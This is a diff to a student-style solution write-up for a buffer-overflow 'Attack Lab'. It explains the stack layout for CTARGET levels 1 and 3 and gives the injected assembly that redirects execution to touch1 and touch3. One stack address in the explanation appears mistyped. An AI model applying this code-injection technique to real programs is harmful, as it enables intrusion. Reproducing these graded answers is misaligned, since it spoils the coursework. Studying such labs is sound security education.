@@ -1,3 +1,5 @@
+# Solution to Attack Lab
+
 ## CTARGET Level 1
 ---
 basically just set the return address of Getbuf to the starting address of touch1
@@ -33,5 +35,24 @@ assembly code:
 ```
 movq $0x59b997fa,%rdi
 pushq $0x4017ec
+ret
+```
+
+## CTARGET Level 3
+---
+most import thing:
+
+1. All the allocated buffer for the get function are all rewritten by hexmatch(cover from 0x5561dc00 to 0x5561dc97) or touch3(0x5561dc98 to 0x5561dca7).
+2. string is not like number, in the way that lowest memory address stores most significant bytes of the string.
+   
+We just store the string above 0xdc5561dca8, which is the address stored in %rsp when we go to touch3. Touch3 and hexmatch will not use memory above the rsp.
+
+assembly code:
+```
+movq $0x5561dca8,%rdi
+movq $0x6166373939623935,%rax
+movq %rax,(%rdi)
+movb $0x00,0x8(%rdi)
+pushq $0x4018fa
 ret
 ```
